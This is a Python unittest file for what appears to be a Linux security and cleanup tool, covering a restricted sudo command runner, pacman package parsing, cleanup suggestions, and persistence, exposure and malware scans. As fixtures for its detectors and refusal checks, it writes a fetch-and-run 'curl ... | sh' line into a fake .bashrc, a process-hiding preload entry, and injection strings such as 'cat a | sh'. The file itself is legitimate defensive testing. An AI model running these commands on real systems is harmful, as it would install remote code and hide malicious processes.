"""Sudo mode (runner), Cleanup and System scan. Everything here is SYNTHETIC: fake home
folders, a fake filesystem root with pacman database entries, fake process snapshots and
stand-in command runners. No real command is run and no password is involved."""

import io
import json
import os
import stat
import subprocess
import tempfile
import time
import unittest
import zipfile
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

from vigil import cleanup, pkgdb, runner, scans

OSR = Path(__file__).parent / "fixtures" / "os-release"
which = lambda name: f"/usr/bin/{name}"


class RunnerTests(unittest.TestCase):
    def test_only_generated_commands(self):
        with self.assertRaisesRegex(runner.Refused, "generated itself"):
            runner.run("sudo pacman -Rns linux", {"sudo pacman -Rns syncthing"}, which=which)

    def test_refuses_shell_syntax_and_editors(self):
        for cmd in ("echo hi && reboot", "cat a | sh", "rm -r /home/u/.cache/*", "ls > /etc/x", "sudoedit /etc/x"):
            with self.subTest(cmd), self.assertRaises(runner.Refused):
                runner.argv_for(cmd, which=which)
        argv, admin = runner.argv_for("sudo nft add chain inet vigil out '{ type filter hook output priority 0 ; }'", which=which)
        self.assertTrue(admin)  # quoted ';' is data, not shell syntax

    def test_admin_goes_through_pkexec_without_a_shell(self):
        argv, admin = runner.argv_for("sudo pacman -Rns syncthing", which=which)
        self.assertEqual(argv, ["/usr/bin/pkexec", "/usr/bin/pacman", "-Rns", "syncthing"])
        argv, admin = runner.argv_for("rm -r ~/.cache/thumbnails", which=which)
        self.assertEqual(argv, ["/usr/bin/rm", "-r", os.path.expanduser("~/.cache/thumbnails")])
        self.assertFalse(admin)
        with self.assertRaisesRegex(runner.Refused, "pkexec"):
            runner.argv_for("sudo pacman -Sc", which=lambda n: None if n == "pkexec" else f"/usr/bin/{n}")

    def test_run_records_and_reports(self):
        calls, events = [], []
        fake = lambda argv, **kw: calls.append((argv, kw)) or SimpleNamespace(returncode=126, stdout=b"", stderr=b"dismissed")
        store = SimpleNamespace(event=lambda *a, **k: events.append((a, k)))
        r = runner.run("sudo pacman -Sc", {"sudo pacman -Sc"}, store=store, runner=fake, which=which)
        self.assertEqual(calls[0][0][0], "/usr/bin/pkexec")
        self.assertNotIn("shell", calls[0][1])
        self.assertIn("cancelled", r["note"])
        self.assertIn("sudo pacman -Sc", events[0][0][2])


class ServerSudoTests(unittest.TestCase):
    def setUp(self):
        from vigil import server
        from .helpers import make_proc
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.app = server.App(f"{self.tmp.name}/data", interval=60, proc_root=make_proc(self.tmp.name), start_monitor=False)
        self.addCleanup(self.app.store.close)

    def test_off_by_default_and_toggle(self):
        from vigil.server import BadRequest
        with self.assertRaisesRegex(BadRequest, "sudo mode is off"):
            self.app.api_run({}, json.dumps({"command": "ls", "source": "cleanup"}).encode(), {})
        self.assertTrue(self.app.api_settings_set({}, b'{"sudo_mode": true}', {})["sudo_mode"])
        ev = self.app.store.one("SELECT summary FROM events WHERE kind='setting' ORDER BY ts DESC")
        self.assertEqual(ev["summary"], "Sudo mode switched on")  # committed, visible to other readers
        path = Path(self.tmp.name, "data", "settings.json")
        self.assertEqual(stat.S_IMODE(path.stat().st_mode), 0o600)
        with self.assertRaisesRegex(BadRequest, "generated itself"):
            self.app.api_run({}, json.dumps({"command": "sudo rm -r /etc", "source": "cleanup"}).encode(), {})


def write_desc(root, name, version, reason=0, depends=(), provides=(), size=1000):
    d = Path(root, "var/lib/pacman/local", f"{name}-{version}")
    d.mkdir(parents=True)
    lines = ["%NAME%", name, "", "%VERSION%", version, "", "%SIZE%", str(size), ""]
    if reason:
        lines += ["%REASON%", str(reason), ""]
    if depends:
        lines += ["%DEPENDS%", *depends, ""]
    if provides:
        lines += ["%PROVIDES%", *provides, ""]
    (d / "desc").write_text("\n".join(lines))


class PkgdbTests(unittest.TestCase):
    def test_orphans_and_vercmp(self):
        with tempfile.TemporaryDirectory() as root:
            write_desc(root, "syncthing", "1.27.0-1", depends=["glibc"])
            write_desc(root, "glibc", "2.40-1", reason=1)
            write_desc(root, "libfoo", "1.0-1", reason=1)                    # nobody needs it
            write_desc(root, "app", "1.0-1", depends=["sh>=1"])
            write_desc(root, "bash", "5.2-1", reason=1, provides=["sh=5.2"])  # needed via provides
            pk = pkgdb.pacman_installed(root)
            self.assertEqual(pkgdb.orphans(pk), ["libfoo"])
        self.assertLess(pkgdb.vercmp("1.0rc1-1", "1.0-1"), 0)
        self.assertGreater(pkgdb.vercmp("1:1.0", "9.9"), 0)


class CleanupTests(unittest.TestCase):
    def test_survey(self):
        with tempfile.TemporaryDirectory() as home, tempfile.TemporaryDirectory() as root:
            big = Path(home, ".cache", "thumbnails")
            big.mkdir(parents=True)
            with open(big / "x.png", "wb") as fh:
                fh.truncate(12 * 2**20)
            spaced = Path(home, ".cache", "My App")
            spaced.mkdir()
            with open(spaced / "c", "wb") as fh:
                fh.truncate(8 * 2**20)
            Path(home, ".local/share/Trash/files").mkdir(parents=True)
            Path(home, ".local/share/Trash/files/old.txt").write_bytes(b"x" * 100)
            dl = Path(home, "Downloads")
            dl.mkdir()
            old = dl / "ancient.iso"
            with open(old, "wb") as fh:
                fh.truncate(600 * 2**20)
            os.utime(old, (time.time() - 200 * 86400,) * 2)
            os.symlink("/nonexistent/target", Path(home, "broken-link"))
            Path(root, "var/cache/pacman/pkg").mkdir(parents=True)
            Path(root, "var/cache/pacman/pkg/a-1.pkg.tar.zst").write_bytes(b"x" * 5000)
            write_desc(root, "libfoo", "1.0-1", reason=1, size=4096)
            osr = {"ID": "arch"}
            r = cleanup.survey(home, root, osr)
            ids = {i["id"]: i for i in r["items"]}
            self.assertEqual(ids["cache:thumbnails"]["commands"], [f"rm -r {big}"])
            self.assertEqual(ids["cache:My App"]["commands"], [f"rm -r '{spaced}'"])
            self.assertEqual(ids["trash"]["commands"], ["gio trash --empty"])
            self.assertEqual(ids["pacman-cache"]["commands"], ["sudo paccache -rk2", "sudo pacman -Sc"])
            self.assertEqual(ids["orphans"]["commands"], ["sudo pacman -Rns libfoo"])
            for personal in ("old-downloads", "large-files", "dead-links"):
                self.assertIn(personal, ids)
                self.assertEqual(ids[personal]["commands"], [])   # listed, never a delete command
            for c in cleanup.commands_for(r["items"]):
                if not c.startswith("sudoedit"):
                    runner.argv_for(c, which=which)               # every offered command is runnable as-is


class ScanTests(unittest.TestCase):
    def test_persistence_flags_and_changes(self):
        with tempfile.TemporaryDirectory() as home, tempfile.TemporaryDirectory() as root:
            auto = Path(home, ".config/autostart")
            auto.mkdir(parents=True)
            (auto / "updater.desktop").write_text("[Desktop Entry]\nExec=/tmp/.x/updater\n")
            Path(home, ".bashrc").write_text("alias ll='ls -l'\ncurl -s http://198.51.100.9/a.sh | sh\n")
            Path(root, "etc").mkdir()
            Path(root, "etc/ld.so.preload").write_text("/usr/lib/libprocesshider.so\n")
            out, state = scans.persistence(home, root)
            by = {r["title"]: r for r in out}
            self.assertEqual(by["Autostart: updater.desktop"]["severity"], "high")
            self.assertIn("temporary folder", by["Autostart: updater.desktop"]["why"])
            self.assertEqual(by["Shell startup file: .bashrc"]["severity"], "high")
            self.assertEqual(by["Preload: ld.so.preload"]["severity"], "high")
            Path(home, ".ssh").mkdir()
            Path(home, ".ssh/authorized_keys").write_text("ssh-ed25519 AAAA one\n")
            out2, state2 = scans.persistence(home, root, state)
            keys = next(r for r in out2 if r["kind"] == "ssh keys")
            self.assertIn("new since the last scan", keys["why"].lower())
            Path(home, ".ssh/authorized_keys").write_text("ssh-ed25519 AAAA one\nssh-rsa BBBB two\n")
            out3, _ = scans.persistence(home, root, state2)
            keys = next(r for r in out3 if r["kind"] == "ssh keys")
            self.assertEqual(keys["severity"], "high")
            self.assertIn("changed since the last scan", keys["why"].lower())

    def test_exposure_and_integrity(self):
        snap = {"sockets": [{"kind": "listen", "proto": "tcp", "local_ip": "0.0.0.0", "local_port": 22, "pid": 5},
                            {"kind": "listen", "proto": "tcp", "local_ip": "127.0.0.1", "local_port": 631, "pid": 6}],
                "processes": {5: {"pid": 5, "name": "sshd", "exe": "/usr/bin/sshd"},
                              7: {"pid": 7, "name": "miner", "exe": "/dev/shm/miner"},
                              8: {"pid": 8, "name": "firefox", "exe": "/usr/lib/firefox/firefox", "exe_deleted": True}}}
        with tempfile.TemporaryDirectory() as root:
            Path(root, "etc/ssh").mkdir(parents=True)
            Path(root, "etc/ssh/sshd_config").write_text("PermitRootLogin yes\n")
            ex = scans.exposure(snap, root)
        titles = [r["title"] for r in ex]
        self.assertIn("sshd accepts connections on tcp/22 (SSH)", titles)
        self.assertFalse(any("631" in t for t in titles))            # loopback only: not exposed
        self.assertIn("SSH allows logging in as root with a password", titles)
        self.assertIn("No firewall found", titles)
        it = {r["title"]: r for r in scans.integrity(snap, "arch")}
        self.assertEqual(it["miner runs from a temporary folder"]["severity"], "high")
        self.assertEqual(it["firefox runs from a file that was deleted or replaced"]["severity"], "low")
        self.assertEqual(it["Deeper check: compare installed files with their packages"]["commands"], ["sudo pacman -Qkk"])

    def test_advisories(self):
        with tempfile.TemporaryDirectory() as data:
            groups = [{"name": "AVG-1", "packages": ["openssl"], "status": "Fixed", "severity": "High",
                       "type": "arbitrary code execution", "affected": "3.3.0-1", "fixed": "3.3.2-1", "issues": ["CVE-2024-0001"]},
                      {"name": "AVG-2", "packages": ["zlib"], "status": "Vulnerable", "severity": "Low",
                       "type": "denial of service", "affected": "1.3-1", "fixed": None, "issues": ["CVE-2024-0002"]},
                      {"name": "AVG-3", "packages": ["curl"], "status": "Fixed", "severity": "Medium",
                       "type": "information disclosure", "affected": "8.0-1", "fixed": "8.5-1", "issues": []}]
            raw = json.dumps(groups).encode()
            scans.update_advisories(data, fetcher=lambda url, limit: raw)
            installed = {"openssl": {"version": "3.3.1-1"}, "zlib": {"version": "1:1.3.1-2"}, "curl": {"version": "8.6-1"}}
            at, found = scans.advisories(data, installed)
        titles = [f["title"] for f in found]
        self.assertIn("openssl 3.3.1-1: arbitrary code execution", titles)
        self.assertIn("zlib 1:1.3.1-2: denial of service", titles)
        self.assertFalse(any(t.startswith("curl") for t in titles))  # already fixed version installed
        self.assertEqual(found[-1]["commands"], ["sudo pacman -Syu"])

    def test_scanner_output_parsing(self):
        out = b"/home/u/Downloads/a.exe: Win.Trojan.Synthetic-1 FOUND\n"
        f, note = scans.clamav_folders(["/home/u/Downloads"], runner=lambda a, **k: SimpleNamespace(stdout=out, returncode=1),
                                       which=lambda n: "/usr/bin/clamdscan" if n == "clamdscan" else None)
        self.assertEqual(f[0]["title"], "ClamAV: Win.Trojan.Synthetic-1 in a.exe")
        y = b"Linux_Miner_Synthetic /tmp/x/xmrig\n"
        f, note = scans.yara_folders(["/tmp"], "/r.yar", runner=lambda a, **k: SimpleNamespace(stdout=y, returncode=0), which=which)
        self.assertEqual((f[0]["rule"], f[0]["path"]), ("Linux_Miner_Synthetic", "/tmp/x/xmrig"))
        self.assertIn("not installed", scans.yara_folders(["/tmp"], None, which=lambda n: None)[1])

    def test_update_yara(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("packages/core/yara-rules-core.yar", "rule synthetic { condition: false }")
        with tempfile.TemporaryDirectory() as data:
            r = scans.update_yara(data, fetcher=lambda url, limit: buf.getvalue())
            self.assertTrue(Path(r["rules"]).read_text().startswith("rule synthetic"))
            self.assertTrue(scans.tools(data)["yara_rules"])


if __name__ == "__main__":
    unittest.main()
